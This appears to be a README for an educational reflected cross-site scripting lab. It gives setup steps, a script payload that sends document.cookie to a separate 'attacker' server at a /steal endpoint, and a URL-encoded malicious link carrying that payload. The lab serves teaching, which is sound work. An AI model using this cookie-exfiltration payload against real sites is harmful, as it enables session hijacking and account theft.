This labs only for education purpose. Don't use it in your infrastructure.

  First of all, try to install node_modules: npm install
  Then run attacker and server: node attacker.js, node server.js
  Paste payload in server input field: 
  <script>
    const cookies = encodeURIComponent(document.cookie);
    new Image().src = `http://localhost:3001/steal?cookie=${cookies}`;
  </script>

   You will see link to website like:
   http://localhost:3000/search?query=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Flocalhost%3A3001%2Fsteal%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E
   Open true link at incognito mode to get coockie, then open malicious link in this incognito mode rowser, then go to console of atckker and look at stolen coockies.

  You also can use:
  docker-compose up --build
